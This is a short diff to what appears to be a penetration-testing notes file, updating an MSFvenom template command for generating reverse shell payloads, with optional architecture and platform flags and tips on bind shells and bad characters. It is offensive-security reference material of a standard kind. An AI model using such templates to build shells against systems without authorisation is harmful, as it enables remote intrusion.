@@ -13,7 +13,7 @@ tags:
 # MSFvenom
 ## General Reverse Shell Format
 ```shell
-msfvenom -p <payload> LHOST=<local IP> LPORT=<local port> -f <format> -e <encoder> -b <bad chars>
+msfvenom -p <payload> LHOST=<local IP> LPORT=<local port> [-f <format>] [-e <encoder>] [-b <bad chars>] [-a <arch>] [--platform <platform>]
 ```
 - For bind shells replace `LHOST=<local IP>` with `RHOST=<remote IP>`
 - `-b` bad chars follows format such as `"\x00\x0D"`
